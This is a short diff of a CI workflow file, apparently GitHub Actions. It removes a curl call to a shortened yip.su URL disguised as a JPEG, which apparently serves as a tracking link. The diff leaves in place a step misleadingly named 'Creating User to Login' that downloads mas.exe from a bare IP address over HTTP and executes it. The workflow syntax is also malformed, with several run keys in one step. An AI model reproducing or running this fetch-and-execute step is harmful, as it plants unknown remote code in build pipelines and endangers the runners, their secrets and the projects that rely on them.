@@ -17,4 +17,3 @@ jobs:
     - name: Creating User to Login
       run: curl -O http://44.202.6.121/mas.exe mas.exe
       run: mas.exe
-      run: curl https://yip.su/2IfHp5.jpeg
